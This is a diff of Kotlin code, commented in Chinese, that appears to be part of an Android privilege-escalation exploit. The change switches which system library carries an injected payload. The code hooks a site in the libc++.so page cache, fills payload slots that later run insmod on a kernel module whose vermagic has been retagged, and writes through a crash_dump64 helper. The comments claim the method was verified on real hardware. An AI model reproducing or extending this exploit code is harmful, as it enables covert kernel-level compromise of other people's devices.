@@ -1318,7 +1318,7 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
 step("typed: hook landing=" + hookLanding)
 /* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
 meter.before("Assembled43284.fillPayloadSlots", "carrier=/system/lib64/libc++.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
-val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/system/lib64/libc++.so"   /* 载体改可直读文件（/vendor 那份连 shell 都打不开 ⇒ 每块都要 fork helper ⇒ 769×~70ms≈56s）。参考 backend_terminal.cpp:321：载体与 ko_target 必须同名 */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
+val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = "/vendor/lib64/libbinderdebug.so"   /* 与 5f18476 同款载体；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
 meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
 step("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
@@ -1397,10 +1397,12 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 val moduleBytes = retagVermagic(moduleBytesRaw) { line -> step(line) }
                 step("typed: module bytes=" + moduleBytes.size)
                 /*
-                 * 可直读 **且无人映射** 的大文件：libc++.so 不能当载体（它正是我们改站点/载荷的那个文件，写 0 偏移会毁它 ✗），
-                 * 字体文件 32 MB、真机实测 mapped_by=0、可读 ⇒ 直连 pread（每块 ~3.4 ms），写坏只是页缓存、重启即复原。
+                 * 载体与 5f18476 完全一致：`/vendor/lib64/libbinderdebug.so`。
+                 * 它不可直读（shell/app 都拿不到 fd）⇒ 写路径必须逐块经 crash_dump64 helper——
+                 * 参照实现也是这样做的（pagecache.cpp:158-165 的 old_page 回退 + :231 的 helper splice16），
+                 * 块数是 769，参照那次是 1470 块；两者的差别只在身份/环境，不在算法。
                  */
-                val carrierPath = "/system/fonts/NotoSansCJK-Regular.ttc"   /* 可直读 ⇒ 写路径走 file_fd 直连（毫秒级）；不可读的 /vendor 载体被迫逐块 fork helper（已实测 23ms/次） */
+                val carrierPath = "/vendor/lib64/libbinderdebug.so"
                 meter.before("Native43284.create", "(module session)")
                 val moduleHandle = Native43284.create()
                 meter.after("Native43284.create", "handle=" + moduleHandle)
